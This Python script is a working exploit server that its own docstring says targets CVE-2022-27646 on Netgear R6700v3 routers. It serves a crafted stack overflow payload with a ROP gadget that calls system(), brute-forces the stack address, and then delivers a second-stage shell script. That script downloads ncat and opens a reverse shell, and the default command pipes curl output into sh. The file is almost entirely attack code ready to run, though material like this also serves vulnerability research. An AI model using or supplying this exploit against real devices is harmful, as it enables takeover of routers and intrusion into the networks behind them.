#!/usr/bin/env python3
## -*- coding: utf-8 -*-
import os
import re
import subprocess
from argparse     import ArgumentDefaultsHelpFormatter, ArgumentParser
from http.server  import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
from typing       import Dict, Tuple

class HttpHandler(BaseHTTPRequestHandler):

    protocol_version = "HTTP/1.1"
    cmd = ""
    cmd_ptr = 0xbeffc104 + 392 + 4
    
    def version_string(self) -> str:
        return "circled.server"
    
    def write_response(self, status_code: int, content_type: str, content: bytes) -> None:
        self.send_response(status_code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)
        return
    
    def serve_stage0_payload(self) -> bytes:
        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
        cmd = "touch${IFS}/tmp/st0;" + HttpHandler.cmd.replace(" ", "${IFS}")
        cmd_ptr = HttpHandler.cmd_ptr

        max_cmd_len = 625-3
        payload  = b"A"*368
        payload += cmd_ptr.to_bytes(4, "little")        # g0_r6_val (addr. of OS command)
        payload += b"B"*20
        payload += b"\xb8\xc9\x00\x00"                  # g0_pc_val (addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
        payload += b"X"*(max_cmd_len-len(cmd)) + b";"   # Fill up with an inexisting command
        payload += bytes(cmd, "UTF-8")[:max_cmd_len]    # OS command to execute
        payload += b";#"
        payload += b" X"                                # String separator: sscanf(str, "%s %s", ...)
        print(f"[*] Stage 0 payload: 0x{cmd_ptr:08x} '{cmd:s}'")

        # Brute force the stack
        HttpHandler.cmd_ptr = cmd_ptr - 0x1000

        return payload
    
    def serve_stage1_payload(self) -> bytes:
        payload = b"""#!/bin/sh
        # Download ncat
        curl http://127.0.0.1:5000/stage1/ncat -o /tmp/ncat
        chmod +x /tmp/ncat

        # Run reverse shell
        /tmp/ncat -e "/bin/sh -i" 127.0.0.1 5001
        """
        return payload
    
    def serve_stage1_ncat(self) -> bytes:
        f = open("./binaries/ncat", "rb")
        ncat = f.read()
        f.close()
        return ncat
    
    def do_GET(self) -> None:
        url_components = urlparse(self.path)
        # Stage 0 payload(s)
        if url_components.path == "/circleinfo.txt":
            self.write_response(200, "application/octet-stream", self.serve_stage0_payload())
        elif url_components.path == "/database.bin":
            self.write_response(200, "application/octet-stream", b"foobar")
        # Stage 1 payload(s)
        elif url_components.path == "/stage1":
            self.write_response(200, "application/octet-stream", self.serve_stage1_payload())
        elif url_components.path == "/stage1/ncat":
            self.write_response(200, "application/octet-stream", self.serve_stage1_ncat())
        # Not found
        else:
            self.write_response(404, "text/plain", b"Not found.")
        return


class HttpServer:

    def __init__(self, args: Dict) -> None:
        self.host = args.host
        self.port = args.port
        HttpHandler.cmd = args.cmd
        return
    
    def run(self) -> None:
        httpd = HTTPServer((self.host, self.port), HttpHandler)
        print(f"[+] HTTP server listens on '{self.host:s}:{self.port:d}'.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()
        print(f"\n[+] HTTP server stopped.")
        return


if __name__ == "__main__":
    # Argument parsing
    description = """
    HTTP server, delivering malicious `circleinfo.txt` and `database.bin` files, exploiting
    CVE-2022-27646 on Netgear R6700v3 routers.

    The default `cmd` will start a reverse shell on the victim. For this to work, ensure to run a
    listener beforehand (`ncat -l -p 5001`).
    """
    parser = ArgumentParser(description=description, formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument("--host", type=str, default="0.0.0.0",
                        help="host of the HTTP server")
    parser.add_argument("--port", type=int, default=5000,
                        help="port of the HTTP server")
    parser.add_argument("--cmd", type=str, default="curl http://127.0.0.1:5000/stage1|sh",
                        help="OS command to execute as stage 0 payload")
    args =  parser.parse_args()

    # HTTP Server
    httpd = HttpServer(args)
    httpd.run()